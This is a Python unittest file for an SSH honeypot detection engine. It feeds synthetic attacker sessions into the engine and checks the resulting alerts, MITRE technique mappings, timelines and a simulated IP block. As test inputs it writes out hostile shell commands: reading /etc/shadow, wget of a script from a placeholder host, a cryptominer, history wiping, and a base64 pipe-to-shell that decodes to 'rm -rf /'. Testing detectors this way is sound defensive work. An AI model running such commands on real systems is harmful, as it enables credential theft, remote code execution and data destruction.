"""Run from the repo folder:  python3 -m unittest discover -s tests -v

Replays synthetic Cowrie events through the real engine (main.handle) against a
temporary database. No Docker, no network, and iptables must never be called.
"""
import os, subprocess, sys, tempfile, unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
os.environ["DB_PATH"] = os.path.join(tempfile.mkdtemp(), "test.db")
os.environ["RESPONSE_MODE"] = "simulate"

import db, detect, geo, main, mitre, timeline  # noqa: E402

geo.country = lambda ip: "Testland"


def ev(ip, eid, n, **kw):
    e = {"src_ip": ip, "eventid": eid, "session": kw.pop("session", "s1"),
         "timestamp": f"2026-10-29T10:00:{n % 60:02d}.000000Z"}
    e.update(kw)
    return e


class Pipeline(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        db.init()
        cls.c = db.conn()
        ip = "198.51.100.7"
        n = 0
        with mock.patch("subprocess.run", side_effect=AssertionError("iptables must not run in simulate mode")):
            for i in range(6):
                n += 1
                main.handle(cls.c, ev(ip, "cowrie.login.failed", n, username="root", password=f"pw{i}"))
            n += 1
            main.handle(cls.c, ev(ip, "cowrie.client.version", n, version="SSH-2.0-x"))   # noise
            n += 1
            main.handle(cls.c, ev(ip, "cowrie.login.success", n, username="root", password="toor"))
            for cmd in ["uname -a", "cat /etc/shadow", "wget http://203.0.113.5/x.sh -O /tmp/x.sh",
                        "chmod +x /tmp/x.sh", "nmap -sV 10.0.0.1", "scp a b@h:/tmp",
                        "history -c", "echo aGk= | sh"]:
                n += 1
                main.handle(cls.c, ev(ip, "cowrie.command.input", n, input=cmd))
            n += 1
            main.handle(cls.c, ev(ip, "cowrie.session.file_download", n, url="http://203.0.113.5/x.sh"))
        cls.c.commit()
        cls.ip = ip

    def rules(self):
        return {r["rule"] for r in self.c.execute("SELECT rule FROM alerts WHERE ip=?", (self.ip,))}

    def test_alerts_for_all_detection_gaps(self):
        r = self.rules()
        for expected in ["SSH brute force", "Credential guessing succeeded", "Password file (/etc/shadow)",
                         "Malware / tool download", "Network scanning", "File transfer (scp/sftp)",
                         "Log / history tampering", "Pipe to shell", "File download captured"]:
            self.assertIn(expected, r)

    def test_alerts_not_duplicated(self):
        n = self.c.execute("SELECT COUNT(*) FROM alerts WHERE ip=? AND rule='Malware / tool download'",
                           (self.ip,)).fetchone()[0]
        self.assertEqual(n, 1)

    def test_response_simulated_only(self):
        rows = list(self.c.execute("SELECT action, mode FROM responses WHERE ip=?", (self.ip,)))
        self.assertIn("BLOCK_IP", {r["action"] for r in rows})
        self.assertEqual({r["mode"] for r in rows}, {"simulate"})
        self.assertEqual(self.c.execute("SELECT blocked FROM attackers WHERE ip=?", (self.ip,)).fetchone()[0], 1)

    def test_timeline_counts_and_no_noise(self):
        t = timeline.build(self.c, self.ip)
        self.assertEqual(t["counts"]["failed"], 6)
        self.assertEqual(t["counts"]["success"], 1)
        self.assertEqual(t["counts"]["commands"], 8)
        self.assertEqual(t["counts"]["downloads"], 1)
        self.assertEqual(t["counts"]["sessions"], 1)
        self.assertNotIn("client.version", " ".join(e["text"] for e in t["events"]))
        self.assertTrue(t["blocked"])
        self.assertGreaterEqual(t["score"], 100)

    def test_login_alert_once_per_ip(self):
        c = db.conn()
        for i in range(5):
            main.handle(c, ev("198.51.100.99", "cowrie.login.success", i, session=f"s{i}", username="root"))
        n = c.execute("SELECT COUNT(*) FROM alerts WHERE ip='198.51.100.99' AND rule='Successful login'").fetchone()[0]
        self.assertEqual(n, 1)

    def test_evidence_is_the_matching_part_only(self):
        m = {x["id"]: x for x in timeline.build(self.c, self.ip)["mitre"]}
        self.assertEqual(m["T1003.008"]["evidence"], "cat /etc/shadow")
        self.assertEqual(m["T1046"]["evidence"], "nmap -sV 10.0.0.1")
        texts = [e["text"] for e in timeline.build(self.c, self.ip)["events"] if e["type"] == "command"]
        self.assertIn("history -c", texts)
        self.assertTrue(all(";" not in t for t in texts))

    def test_mitre_gaps(self):
        ids = {m["id"] for m in timeline.build(self.c, self.ip)["mitre"]}
        for tid in ["T1110.001", "T1078", "T1105", "T1046", "T1003.008", "T1070.003", "T1027", "T1082"]:
            self.assertIn(tid, ids)


class Rules(unittest.TestCase):
    def setUp(self):
        self.c = db.conn()

    def names(self, cmd):
        return {r for r, *_ in detect.evaluate(self.c, {"eventid": "cowrie.command.input", "src_ip": "x", "input": cmd})}

    def test_gap_commands(self):
        self.assertIn("Network scanning", self.names("nmap -sS 192.168.1.0/24"))
        self.assertIn("File transfer (scp/sftp)", self.names("scp root@1.2.3.4:/etc/passwd ."))
        self.assertIn("Cryptominer", self.names("./xmrig -o stratum+tcp://pool:3333"))
        self.assertIn("Log / history tampering", self.names("history -c"))
        self.assertIn("Scripted download (python)", self.names("python3 -c 'import urllib.request as u; u.urlretrieve(\"http://a/b\",\"b\")'"))
        self.assertIn("Pipe to shell", self.names("echo cm0gLXJmIC8= | base64 -d | sh"))
        self.assertIn("Password file (/etc/shadow)", self.names("cat /etc/shadow"))

    def test_benign_not_flagged_high(self):
        self.assertEqual(self.names("ls -la"), {"Reconnaissance"})
        self.assertEqual(self.names("cd /tmp"), set())

    def test_mitre_shadow_and_scan(self):
        ev = [{"eventid": "cowrie.command.input", "command": "cat /etc/shadow"},
              {"eventid": "cowrie.command.input", "command": "nmap 10.0.0.1"}]
        ids = set(mitre.map_events(ev))
        self.assertIn("T1003.008", ids)
        self.assertIn("T1046", ids)


if __name__ == "__main__":
    unittest.main()
